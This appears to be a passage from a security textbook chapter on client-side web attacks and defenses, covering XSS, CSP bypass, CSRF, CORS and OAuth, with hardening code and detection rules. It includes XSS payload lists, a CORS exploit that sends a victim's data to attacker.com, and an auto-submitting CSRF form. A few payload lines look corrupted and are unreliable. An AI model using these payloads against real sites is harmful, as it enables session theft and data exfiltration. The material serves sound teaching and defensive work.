# Domain 8, Chapter 8A — Client-Side Attacks, Authentication, and Session Security

> **Scope.** XSS (reflected, stored, DOM-based, mutation, blind, universal). Payload taxonomy (script injection, event handlers, SVG/MathML vectors, polyglot payloads, encoding bypass). CSP directives, nonces, hashes, `strict-dynamic`, and bypass techniques (JSONP, AngularJS, dangling markup, DOM clobbering, script gadgets, trusted-types bypass). Trusted Types. CSRF and SameSite cookies. CORS and misconfiguration. Cross-site leaks. Same-origin policy. Clickjacking (frame-busting bypass, UI redressing, cursor hijacking). Client-side storage attacks (localStorage/sessionStorage theft, IndexedDB extraction, cookie tossing). PostMessage vulnerabilities. Browser security headers matrix (CSP, HSTS, X-Content-Type-Options, Permissions-Policy, COEP/COOP/CORP). OAuth 2.0 / OIDC (code flow, implicit, PKCE, state, redirect_uri, JWT algorithm confusion, `kid`/`jku`/`jwk` injection). SAML (signature wrapping, canonicalization, assertion replay). JWT attacks. Session fixation/prediction. WebAuthn/FIDO2. Authentication deep dive (cookie security attributes, session token entropy, JWT CVE-2022-23529, refresh token rotation, password hashing with Argon2id/bcrypt, MFA comparison). Advanced web attacks (DOM clobbering, HTTP request smuggling CL.TE/TE.CL/TE.TE, web cache poisoning, SSRF with cloud metadata exploitation, deserialization ysoserial/pickle/phpggc, GraphQL security). Web detection engineering (Sigma rules, YARA web shell signatures, WAF CRS tuning, Cloudflare WAF rules, SRI failure alerting). Web hardening reference (CSP progressive deployment, CORS hardening, SRI deployment, security headers checklist, API rate limiting, OAuth scope minimization).
>
> **Prerequisites.** Domain 13 Chapter 13A (cryptographic primitives, hash functions, digital signatures). Domain 13 Chapter 13B §1–3 (TLS, certificate pinning, PKI).

---

## 1. Same-origin policy

The SOP is the browser's foundational security boundary. Two URLs share an origin if and only if their **scheme**, **host**, and **port** are identical. `https://a.example.com:443` and `https://b.example.com:443` are different origins (different hosts). `http://example.com` and `https://example.com` are different origins (different schemes).

The SOP governs: **DOM access** (a script from origin A cannot read the DOM of a page from origin B loaded in an iframe or popup, except via `postMessage`), **JavaScript API access** (`XMLHttpRequest`/`fetch` cannot read responses from cross-origin requests unless CORS permits it — the request is sent, but the response is opaque), **cookies** (scoped by domain and path, not exactly origin — a subtlety that creates gaps), and **storage** (`localStorage`/`sessionStorage` are strictly per-origin).

Key nuances: cookies use domain-based scoping (a cookie set on `.example.com` is sent to all subdomains), which is broader than origin. `document.domain` can be relaxed (both frames set `document.domain = "example.com"`) to enable cross-subdomain DOM access, though this feature is being deprecated. Null origins (from `data:` URIs, sandboxed iframes) are treated as unique/opaque — they don't match any other origin, including other null origins.

**Site vs. Origin.** The "site" concept (used by `SameSite` cookies) is broader than "origin": a site is defined by the registrable domain (eTLD+1). `https://a.example.com` and `https://b.example.com` are the same site but different origins. This distinction is critical for understanding SameSite cookie behavior vs. CORS enforcement.

**Process isolation.** Modern browsers enforce SOP at the process level via Site Isolation (Chrome) / Project Fission (Firefox). Each site runs in a dedicated renderer process. Even if a renderer is compromised via memory corruption, the process boundary prevents reading cross-site data. This is the defense-in-depth backstop for Spectre-class attacks against the SOP.

---

## 2. Cross-site scripting (XSS)

### 2.1 Variants

**Reflected XSS.** The attacker's payload is included in a URL parameter (or POST body), reflected by the server into the response HTML without sanitization, and executed by the victim's browser when they visit the crafted URL. The payload lives in the request; the vulnerability is the server's failure to sanitize.

**Stored XSS.** The payload is stored in the application's database (in a comment, profile field, message, etc.) and rendered to every user who views the page. More dangerous than reflected because it doesn't require the victim to click a crafted link.

**DOM-based XSS.** The payload never touches the server. Client-side JavaScript reads a user-controlled source (e.g., `location.hash`, `document.referrer`, `postMessage` data) and writes it into a dangerous sink (`innerHTML`, `eval`, `document.write`, `setTimeout` with string argument). The server response is clean; the vulnerability is entirely in the client-side code.

**Mutation XSS (mXSS).** The payload is crafted to appear benign to a sanitizer but transforms into active content when the browser parses and re-serializes the DOM. HTML parsing is complex and context-dependent; a string that is inert in one parsing context (e.g., inside `<math>` or `<svg>`) may become executable when re-parsed in another context. mXSS bypasses sanitizers that operate on the string representation rather than the parsed DOM.

**Blind XSS.** The payload is stored and executes in a context the attacker cannot directly observe (an admin panel, a log viewer, an internal tool). The attacker includes a callback (e.g., a request to their server with the stolen cookie) in the payload and waits for it to fire when an admin views the stored data.

**Universal XSS (UXSS).** A vulnerability in the browser itself (not the web application) that allows script execution across origins. UXSS bugs in browser extensions, PDF viewers, or the browser's SOP enforcement are the highest-severity XSS class because they affect all sites.

### 2.2 Payload taxonomy

**Script injection — direct tags:**
```html
<script>alert(document.cookie)</script>
<script src="https://attacker.com/hook.js"></script>
```

**Event handlers — tag attribute injection:**
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<svg onload=alert(1)>
```

**SVG / MathML vectors — namespace-switching to bypass HTML-context filters:**
```html
<svg><script>alert(1)</script></svg>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x to=1>
```

**JavaScript URI handlers:**
```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><button>submit</button></form>
```

**Polyglot payloads — trigger in multiple injection contexts:**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0teleport%0teleportAoNcliCk=alert()//</stYle/</teleport/</titLe/</teleport/</sVg/</sCript/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

**Data-URI XSS:**
```html
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 2.3 Filter bypass techniques

**Encoding tricks.** Filters checking for `<script>` can be bypassed with:
```
%3Cscript%3E              URL encoding
&#60;script&#62;           HTML entity (decimal)
&#x3C;script&#x3E;         HTML entity (hex)
<script>         Unicode escape (in JS context)
\x3cscript\x3e             Hex escape (in JS context)
```

**Case variations:** `<ScRiPt>`, `<SCRIPT>`, `<scRIPT SRC=...>`. HTML tag names are case-insensitive; many regex filters are not.

**Null byte insertion:** `<scr%00ipt>` — some backends truncate at null bytes while the browser processes the full string (legacy behavior, primarily PHP <= 5.3).

**Tag and attribute splitting:**
```html
<img/src=x/onerror=alert(1)>     slash as separator
<img	src=x	onerror=alert(1)>    tab characters
<img%0asrc=x%0aonerror=alert(1)>  newline characters (URL-encoded)
```

**Nested/broken tags to confuse sanitizers:**
```html
<sc<script>ript>alert(1)</sc</script>ript>
<<script>alert(1)//<</script>
```

**JavaScript string obfuscation in event handlers:**
```html
<img src=x onerror=alert`1`>                   template literal
<img src=x onerror=window['ale'+'rt'](1)>      string concat
<img src=x onerror=eval(atob('YWxlcnQoMSk='))> base64 decode
<img src=x onerror=top[8680439..toString(30)](1)> number-to-string
```

**DOM clobbering for filter bypass.** If a filter uses `document.getElementById` to check for existing elements, the attacker can inject elements with specific `id` attributes to shadow global variables the filter relies on, causing the filter function to crash or skip validation.

### 2.4 XSS in modern frameworks

**React — `dangerouslySetInnerHTML`.** React auto-escapes interpolated values in JSX (`{userInput}` is safe). The explicit escape hatch `dangerouslySetInnerHTML={{__html: userInput}}` bypasses this. The `href` attribute on `<a>` tags also accepts `javascript:` URIs if not filtered.

Hardening:
```jsx
// WRONG — raw HTML injection
<div dangerouslySetInnerHTML={{__html: userComment}} />

// CORRECT — sanitize with DOMPurify before injection
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userComment)}} />

// WRONG — javascript: URI in href
<a href={userProvidedUrl}>link</a>

// CORRECT — validate URL scheme
const safeUrl = /^https?:\/\//.test(userProvidedUrl) ? userProvidedUrl : '#';
<a href={safeUrl}>link</a>
```

**Angular — template injection.** Angular compiles templates containing `{{ expression }}` syntax. If user input is interpolated into a template that is then compiled (server-side template concatenation), the attacker can inject Angular expressions. In AngularJS (1.x), the sandbox was never a security boundary:
```
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}alert(1)//')}}
```
Angular 2+ eliminated the sandbox but introduced `bypassSecurityTrustHtml()` / `bypassSecurityTrustScript()` — these are explicit opt-outs from Angular's built-in sanitization and are XSS sinks if used with untrusted data.

**Vue — `v-html` directive.** Vue's `{{ }}` interpolation auto-escapes. The `v-html` directive renders raw HTML:
```html
<!-- VULNERABLE -->
<div v-html="userInput"></div>

<!-- SAFE — auto-escaped -->
<div>{{ userInput }}</div>
```

### 2.5 Content Security Policy (CSP)

CSP is a browser-enforced allowlist for resource loading, delivered via the `Content-Security-Policy` HTTP header. Key directives:

`script-src`: controls which scripts can execute. Values include origins (`https://cdn.example.com`), `'self'` (same origin), `'unsafe-inline'` (allows inline scripts — defeats the purpose of CSP against XSS), `'unsafe-eval'` (allows `eval` and similar), `'nonce-<random>'` (allows scripts with a matching `nonce` attribute), `'sha256-<hash>'` (allows scripts whose content matches the hash), and `'strict-dynamic'` (scripts loaded by an already-trusted script are trusted, regardless of the allowlist).

`default-src`: fallback for all directives not explicitly set. `style-src`, `img-src`, `connect-src` (XHR/fetch/WebSocket), `font-src`, `media-src`, `object-src` (plugins), `frame-src` (iframes), `frame-ancestors` (who can iframe this page — the modern replacement for `X-Frame-Options`), `base-uri` (restricts `<base href>`), `form-action` (restricts form submission targets).

A strong CSP: `script-src 'nonce-<random>' 'strict-dynamic'; object-src 'none'; base-uri 'self'; frame-ancestors 'self'`. This allows only scripts with a per-response nonce, permits dynamically-loaded scripts from trusted loaders, blocks plugins and base-URI hijacking, and prevents framing by other sites.

**Framework-specific CSP implementation:**

Express (with helmet):
```js
const helmet = require('helmet');
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(32).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`, "'strict-dynamic'"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    frameAncestors: ["'self'"],
    formAction: ["'self'"],
  }
}));
```

Django:
```python
# settings.py
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'", "'strict-dynamic'")  # nonce added via middleware
CSP_OBJECT_SRC = ("'none'",)
CSP_BASE_URI = ("'self'",)
CSP_FRAME_ANCESTORS = ("'self'",)
CSP_INCLUDE_NONCE_IN = ['script-src']  # django-csp middleware
```

Spring Security:
```java
@Override
protected void configure(HttpSecurity http) throws Exception {
    http.headers()
        .contentSecurityPolicy("script-src 'self' 'strict-dynamic' 'nonce-{nonce}'; "
            + "object-src 'none'; base-uri 'self'; frame-ancestors 'self'");
}
```

### 2.6 CSP bypass techniques

**JSONP endpoints.** If the CSP allowlists a domain that hosts a JSONP endpoint (e.g., `script-src https://api.example.com`), the attacker can load `https://api.example.com/jsonp?callback=alert(1)//` as a script, executing arbitrary JavaScript. Mitigation: avoid allowlisting domains with JSONP; use `strict-dynamic` with nonces instead.

**Exploitation with Burp Suite:**
1. Identify CSP with `script-src` allowlisting third-party domains.
2. Use Burp's active scanner — it automatically tests for CSP bypass via JSONP.
3. Manually enumerate: browse to the allowlisted domain, search for endpoints accepting `callback`, `jsonp`, or `cb` parameters.
4. Inject: `<script src="https://allowlisted-cdn.com/api?callback=alert(document.domain)//"></script>`.

**AngularJS sandbox escape.** If AngularJS is loaded (from an allowlisted CDN) and the page includes `ng-app` or similar directives, the attacker can use Angular template expressions to execute JavaScript. AngularJS's template sandbox was never a security boundary and was formally deprecated. Mitigation: don't serve AngularJS from CSP-allowlisted domains; use `strict-dynamic`.

Exploitation: if `https://cdnjs.cloudflare.com` is in `script-src`:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

**Dangling markup injection.** If the attacker can inject partial HTML (e.g., an unclosed `<img src="https://attacker.com/?` tag), the browser may include subsequent page content (including CSRF tokens, nonces) as part of the tag's attribute value, sending it to the attacker's server as a query parameter. CSP doesn't prevent HTML injection — only script execution.

**Base-URI hijacking.** If `base-uri` is not restricted, the attacker injects `<base href="https://attacker.com/">`. All relative script URLs in the page now resolve against the attacker's server, bypassing `script-src 'self'`.

**DOM clobbering.** HTML elements with `id` or `name` attributes create global variables in JavaScript (`<img id="x">` makes `window.x` reference the element). If application code accesses a global like `window.config` expecting an object but the attacker has injected `<form id="config"><input name="url" value="https://evil.com">`, the code reads attacker-controlled values. DOM clobbering can manipulate script-loading logic without executing any script directly.

**Script gadgets in frameworks.** Many JavaScript frameworks (React, Vue, jQuery) contain code patterns that convert data attributes or DOM state into code execution. If the attacker can inject HTML attributes that a framework's initialization code processes, the framework itself becomes the XSS vector — even with a strict CSP that blocks inline scripts.

Example jQuery gadget: `<form class="jquery-hierarchical-select"><input name="0" value="<img src=x onerror=alert(1)>"></form>` — jQuery plugins that read DOM values and inject them unsanitized.

**`strict-dynamic` bypass via script-created scripts.** If a trusted script creates new `<script>` elements based on attacker-controlled data (e.g., reading a `data-src` attribute from the DOM), the new script inherits trust under `strict-dynamic`. The attacker injects `<div data-src="https://attacker.com/evil.js">` and the trusted script loads it.

**Nuclei template for CSP evaluation:**
```yaml
id: csp-missing-or-weak
info:
  name: Missing or Weak Content-Security-Policy
  severity: medium
  tags: csp,misconfiguration
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: or
    matchers:
      - type: regex
        part: header
        regex:
          - "Content-Security-Policy.*unsafe-inline"
          - "Content-Security-Policy.*unsafe-eval"
        condition: or
      - type: word
        part: header
        words:
          - "Content-Security-Policy"
        negative: true
```

### 2.7 Trusted Types

Trusted Types (a W3C specification, enforced via CSP: `require-trusted-types-for 'script'`) prevent DOM XSS by requiring that dangerous DOM sinks (`innerHTML`, `eval`, `document.write`, `setTimeout` with string, script `src` assignment) accept only typed objects (`TrustedHTML`, `TrustedScript`, `TrustedScriptURL`) rather than raw strings. The application must create Trusted Type values through a policy function that performs sanitization. Passing a raw string to a dangerous sink throws a `TypeError`.

This is the most effective DOM XSS prevention mechanism because it moves sanitization enforcement to the browser (compile-time-like type checking at runtime), rather than relying on developers to always remember to sanitize.

**Implementation:**
```js
// Create a policy
const policy = trustedTypes.createPolicy('sanitizer', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => {
    const url = new URL(input, location.origin);
    if (url.origin !== location.origin) throw new Error('Cross-origin script blocked');
    return url.toString();
  }
});

// Usage — this is the only way to set innerHTML when Trusted Types are enforced
element.innerHTML = policy.createHTML(userContent);

// Direct string assignment throws TypeError:
// element.innerHTML = userContent; // TypeError: This document requires 'TrustedHTML'
```

**CSP header to enforce:**
```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types sanitizer default
```

### 2.8 XSS detection

**Burp Suite procedure:**
1. Proxy traffic through Burp, map the application (Spider/Crawl).
2. Use the Intruder module with XSS payload lists (from SecLists: `Fuzzing/XSS/`).
3. For reflected XSS: identify reflection points in responses — search for your canary string in the response body, note the HTML context (attribute, tag, JavaScript string).
4. Craft context-appropriate payloads: inside an attribute → `" onmouseover=alert(1) x="`, inside a script string → `';alert(1)//`, inside a tag → `<img src=x onerror=alert(1)>`.
5. Use Burp's Collaborator for blind XSS detection — payloads that call back to the Collaborator server.

**OWASP ZAP:**
1. Enable the Active Scanner.
2. Under Scan Policy → Injection → Cross-Site Scripting, set all XSS scanners to `HIGH` threshold.
3. Configure the Script-based scanner for DOM XSS: ZAP's AJAX Spider with DOM XSS rules traces client-side code paths.
4. Review alerts under the "Cross Site Scripting" category.

**WAF detection (ModSecurity CRS):**
```
# OWASP CRS Rule 941100 — XSS Attack Detected via libinjection
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|ARGS|ARGS_NAMES "@detectXSS" \
    "id:941100,phase:2,block,msg:'XSS Attack Detected',severity:'CRITICAL',tag:'OWASP_CRS'"

# Custom rule — block common event handler XSS
SecRule ARGS "@rx (?i)on(error|load|click|focus|mouseover|submit)\s*=" \
    "id:941200,phase:2,block,msg:'Event Handler XSS Attempt'"
```

**NGINX WAF (naxsi):**
```
# /etc/nginx/naxsi_core.rules
BasicRule "str:<script" "msg:script tag injection" "mz:ARGS|BODY|URL" "s:$XSS:8" id:1302;
BasicRule "str:javascript:" "msg:javascript URI" "mz:ARGS|BODY" "s:$XSS:8" id:1303;
BasicRule "rx:on\w+\s*=" "msg:event handler injection" "mz:ARGS|BODY" "s:$XSS:8" id:1304;
```

**SIEM query (Splunk):**
```spl
index=web sourcetype=access_combined
| regex _raw="(?i)(<script|javascript:|on(error|load|click|focus)=|eval\(|document\.cookie)"
| stats count by src_ip, uri_path, status
| where count > 5
| sort -count
```

### 2.9 XSS hardening checklist

| Layer | Control | What it prevents |
|-------|---------|------------------|
| Output encoding | Context-aware escaping (HTML, attribute, JS, URL, CSS) | Reflected/stored XSS |
| CSP | `script-src 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'self'` | Inline script execution, plugin-based XSS |
| Trusted Types | `require-trusted-types-for 'script'` | DOM XSS |
| HttpOnly cookies | `Set-Cookie: session=...; HttpOnly` | Cookie theft via XSS |
| Sanitization | DOMPurify on user-generated HTML (when rich text is required) | Stored XSS in rich content |
| Framework defaults | React JSX auto-escaping, Angular template sanitization, Vue `{{ }}` | Framework-specific XSS |
| Input validation | Reject or strip HTML in fields that should not contain markup | Defense-in-depth |

### 2.10 Real-world CVEs

**CVE-2020-11022 / CVE-2020-11023 — jQuery XSS.** jQuery's `$(htmlString)` and `.html()` methods accepted untrusted HTML that could result in XSS when passed HTML containing `<option>` or `<style>` elements with embedded scripts. Affected jQuery < 3.5.0. Impact: any application using jQuery to render user-supplied HTML was vulnerable.

**CVE-2019-11358 — jQuery prototype pollution.** `$.extend(true, {}, maliciousObject)` allowed prototype pollution via `__proto__`, which could chain into DOM XSS if polluted properties were used in DOM sinks.

**CVE-2021-23440 — set-value prototype pollution → XSS.** The `set-value` npm package allowed prototype pollution via crafted property paths. Applications using this package to process user input could have `Object.prototype` polluted with properties consumed by template engines, leading to XSS.

**DOMPurify mXSS bypasses.** Multiple mXSS vectors have been found in DOMPurify versions (e.g., via `<math>`, `<svg>`, and namespace-switching tricks). DOMPurify's changelog documents these fixes. The lesson: even purpose-built sanitizers are not infallible. Defense requires CSP + Trusted Types + sanitizer, not sanitizer alone.

---

## 3. CSRF, CORS, and cross-site leaks

### 3.1 CSRF

**Mechanism.** Cross-Site Request Forgery: the attacker's site causes the victim's browser to send an authenticated request (with cookies) to a target site, performing an action the victim didn't intend. The browser automatically attaches cookies for the target domain. The attacker doesn't need to read the response — only trigger the side effect (transfer funds, change email, update password).

**Classic payload — auto-submitting form:**
```html
<html>
<body onload="document.getElementById('csrf-form').submit()">
<form id="csrf-form" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
</body>
</html>
```

**JSON content-type trick.** If the server accepts `application/json` but doesn't validate the `Content-Type` header strictly, the attacker can send JSON via a form with `enctype="text/plain"`:
```html
<form action="https://api.target.com/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","padding":"' value='"}' />
</form>
```
The body becomes `{"email":"attacker@evil.com","padding":"="}` — valid JSON that the server may process.

**Token bypass techniques:**

- *Token fixation:* If the CSRF token is not tied to the user's session but is a standalone value, the attacker can obtain a valid token from their own session and embed it in the CSRF payload. The server accepts it because it's structurally valid.
- *Token in URL parameter:* Tokens passed as GET parameters leak via `Referer` header, browser history, and server access logs.
- *Weak token generation:* Tokens based on predictable values (timestamp, sequential counter, MD5 of session ID) can be computed by the attacker.
- *Token not validated on specific methods:* Some implementations check tokens on POST but not PUT/DELETE/PATCH.

**Defenses.**

SameSite cookies: `SameSite=Lax` (default in modern browsers) sends cookies on top-level navigations (GET requests via link clicks, form GETs) but not on cross-site subrequests (XHR, fetch, iframe POST, form POST from another site). `SameSite=Strict` blocks cookies on all cross-site requests including top-level navigations. `SameSite=None; Secure` allows cross-site sending (required for legitimate cross-site cookies like SSO).

| Scenario | Lax | Strict | None |
|----------|-----|--------|------|
| User clicks link from attacker site to target | Cookie sent | Cookie NOT sent | Cookie sent |
| JS fetch from attacker site to target | Cookie NOT sent | Cookie NOT sent | Cookie sent |
| Form POST from attacker site to target | Cookie NOT sent | Cookie NOT sent | Cookie sent |
| Iframe loading target from attacker site | Cookie NOT sent | Cookie NOT sent | Cookie sent |
| Top-level redirect (302) from attacker | Cookie sent (Lax <= 2min after set) | Cookie NOT sent | Cookie sent |

CSRF tokens: a per-session or per-request random token embedded in forms and validated server-side. The attacker cannot read the token from the target site (SOP prevents it) and therefore cannot include it in the forged request.

Double-submit cookie pattern: the server sets a random value as both a cookie and a hidden form field. On submission, the server checks that the cookie value matches the form field value. An attacker from a different origin can send the cookie (the browser does this automatically) but cannot set the form field to the correct value (they can't read the cookie via JavaScript due to SOP). Weakness: if the attacker controls a subdomain, they can set cookies for the parent domain (cookie tossing — see §6).

Custom header defense: APIs that require a custom header (e.g., `X-Requested-With: XMLHttpRequest`) are protected because cross-origin requests with custom headers trigger a CORS preflight. Simple forms cannot set custom headers. This defense fails if CORS is misconfigured to allow the custom header from any origin.

`Origin`/`Referer` header validation: the server checks that the request's `Origin` header matches the expected origin. The `Origin` header is sent by browsers on POST requests and cannot be spoofed by JavaScript.

**Framework implementations:**

Express (csurf / csrf-csrf):
```js
const { doubleCsrf } = require('csrf-csrf');
const { doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieName: '__csrf',
  cookieOptions: { sameSite: 'strict', secure: true, httpOnly: true },
});
app.use(doubleCsrfProtection);
```

Django (built-in):
```python
# settings.py — enabled by default via CsrfViewMiddleware
CSRF_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True
# Templates: {% csrf_token %} in every form
```

Spring Security (built-in):
```java
// Enabled by default. For SPA with cookie-based tokens:
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    .csrfTokenRequestHandler(new XorCsrfTokenRequestAttributeHandler())
);
```

Rails (built-in):
```ruby
# ApplicationController — enabled by default
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception
end
# Views: <%= csrf_meta_tags %> in layout head
```

**Detection — SIEM query (Splunk):**
```spl
index=web sourcetype=access_combined method=POST
| eval has_origin=if(isnotnull(origin), 1, 0)
| eval origin_match=if(origin="https://legitimate-site.com", 1, 0)
| where has_origin=1 AND origin_match=0
| stats count by src_ip, uri_path, origin
| sort -count
```

**Real-world incidents:**
- **Netflix CSRF (2006):** Attackers could change Netflix account email addresses and shipping addresses via CSRF, enabling full account takeover. Netflix had no CSRF token protection.
- **Gmail contact theft (2007):** A CSRF vulnerability in Gmail's contact export API allowed any website to silently export a logged-in user's entire address book by embedding a request to the export endpoint.
- **SameSite=Lax 2-minute window:** Chromium's implementation sends `SameSite=Lax` cookies on cross-site top-level POST requests for 2 minutes after the cookie is set, as a compatibility measure. This creates a brief CSRF window for cookies set via `Set-Cookie` without an explicit `SameSite` attribute.

### 3.2 CORS

Cross-Origin Resource Sharing allows servers to selectively relax the SOP. The server includes `Access-Control-Allow-Origin: https://requester.com` to permit cross-origin reads. `Access-Control-Allow-Credentials: true` allows cookies to be sent on cross-origin requests.

**Misconfigurations.**

*Reflected origin:* `Access-Control-Allow-Origin: <reflected-origin>` with `Access-Control-Allow-Credentials: true` — the server reflects whatever `Origin` the requester sends. This is equivalent to disabling the SOP for that endpoint.

*Null origin:* The server allows `Origin: null` with credentials. Null origins come from sandboxed iframes, `data:` URIs, and local files. An attacker can trigger a null origin:
```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://target.com/api/user', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('https://attacker.com/log?data='+JSON.stringify(d)))
</script>">
</iframe>
```

*Regex origin validation bypass:* Server validates origin with regex like `/^https:\/\/.*\.example\.com$/` — bypassed with `https://evil.example.com.attacker.com` (subdomain of attacker) or `https://notexample.com` if the regex is `example.com` without anchoring.

*Wildcard with credentials:* `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is invalid per the spec (browsers reject it), but some custom CORS middleware implementations don't enforce this.

**Exploitation — Burp Suite:**
1. Send a request with `Origin: https://attacker.com`.
2. Check if the response reflects this origin in `Access-Control-Allow-Origin`.
3. Check for `Access-Control-Allow-Credentials: true`.
4. If both are present: full cross-origin read of authenticated data.
5. Craft exploit page to extract data.

**Exploitation — curl verification:**
```bash
curl -s -H "Origin: https://attacker.com" -I https://target.com/api/user \
  | grep -i "access-control"
# If Access-Control-Allow-Origin: https://attacker.com appears → misconfigured
```

**Nuclei template:**
```yaml
id: cors-misconfiguration
info:
  name: CORS Misconfiguration
  severity: high
  tags: cors,misconfiguration
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: "https://evil.com"
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"
```

**Hardening — correct CORS implementation (Express):**
```js
const allowedOrigins = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');
    return res.sendStatus(204);
  }
  next();
});
```

**Preflight requests.** Non-simple requests (PUT, DELETE, custom headers, non-form content types) trigger an `OPTIONS` preflight. The server must respond with appropriate `Allow-*` headers. Misconfigurations in preflight handling (overly permissive `Access-Control-Allow-Headers` or `Allow-Methods`) expand the attack surface.

**CORS → CSRF chain.** If CORS is misconfigured to allow `PUT`/`DELETE` from any origin with credentials, the attacker can perform state-changing operations that would normally be blocked by SOP. This is a CORS-to-CSRF chain — the CORS misconfiguration enables CSRF on methods that HTML forms cannot trigger.

**Real-world incidents:**
- **Bitcoin exchanges (2014–2016):** Multiple cryptocurrency exchanges reflected the `Origin` header with credentials enabled, allowing any website to read authenticated account balances and transaction history.
- **Reflected origin is the dominant pattern:** Bug bounty programs consistently report reflected-origin CORS as one of the most common web misconfigurations. The root cause is usually middleware that dynamically sets `Access-Control-Allow-Origin` from the request `Origin` header without an allowlist check.

### 3.3 Cross-site leaks (XS-Leaks)

XS-Leaks exploit observable differences in cross-origin responses to infer information the attacker shouldn't have. Categories:

**Timing-based.** The attacker measures how long a cross-origin request takes. If the response varies in size or processing time based on the victim's state (e.g., a search that returns results only if the victim is logged in), the timing difference leaks the state.

**Error-based.** The attacker loads a cross-origin resource and observes whether it loads successfully or throws an error (e.g., `<img>` load error, `<script>` parse error). The success/failure depends on the victim's authentication state.

**Cache-based.** The attacker checks whether a cross-origin resource is in the browser cache (by timing a load). If the victim previously visited the resource, it's cached — leaking browsing history.

**Frame counting.** `window.open()` returns a handle; `handle.frames.length` is readable cross-origin. If the number of frames differs based on authentication state or query results, information leaks.

Mitigations: `SameSite` cookies (prevent authenticated cross-site requests), CORB/ORB (block sensitive cross-origin responses from reaching the attacker's rendering context), `Cache-Control: no-store` (prevent caching of sensitive resources), `Vary: Cookie` (ensure cached responses are not shared across authentication states), COOP/COEP (isolate browsing context groups — see §8).

---

## 4. OAuth 2.0 and OpenID Connect

### 4.1 Authorization code flow

The standard secure flow: (1) client redirects user to authorization server with `response_type=code`, `client_id`, `redirect_uri`, `state`, `scope`. (2) User authenticates and authorizes. (3) Authorization server redirects back to `redirect_uri` with an authorization `code` and the `state`. (4) Client exchanges the `code` for tokens (access token, ID token) via a back-channel POST to the token endpoint, authenticating with `client_secret`. (5) Client uses the access token to call resource APIs.

### 4.2 Attack vectors

**`redirect_uri` validation failures.** If the authorization server doesn't strictly validate `redirect_uri`, the attacker can register a redirect to their own domain and steal the authorization code.

Exploitation patterns:
- *Open redirect on the legitimate domain:* `redirect_uri=https://legitimate.com/redirect?url=https://attacker.com` — the authorization server validates the domain but the application has an open redirect that forwards the code.
- *Path traversal:* `redirect_uri=https://legitimate.com/callback/../attacker-controlled-path`.
- *Subdomain takeover:* `redirect_uri=https://unused-subdomain.legitimate.com/callback` — if the subdomain has a dangling DNS record, the attacker claims it.
- *Parameter pollution:* `redirect_uri=https://legitimate.com/callback&redirect_uri=https://attacker.com/steal` — some servers use the second value.

Validation must be exact-match (not prefix, not subdomain, not open-redirect-through).

**`state` parameter omission.** Without a `state` parameter (a random value tied to the user's session), the attacker can perform a CSRF-like attack: initiate an OAuth flow with their own account and trick the victim into completing it, linking the attacker's account to the victim's session (login CSRF).

**PKCE (Proof Key for Code Exchange).** For public clients (mobile apps, SPAs) that cannot securely store a `client_secret`, PKCE prevents authorization code interception. The client generates a random `code_verifier`, sends `code_challenge = BASE64URL(SHA256(code_verifier))` in the authorization request, and sends `code_verifier` in the token request. An attacker who intercepts the code cannot exchange it without the verifier.

PKCE bypass attempts:
- *Downgrade to `plain` method:* If the server accepts `code_challenge_method=plain`, the challenge equals the verifier and interception defeats the protection. Servers must reject `plain` or default to `S256`.
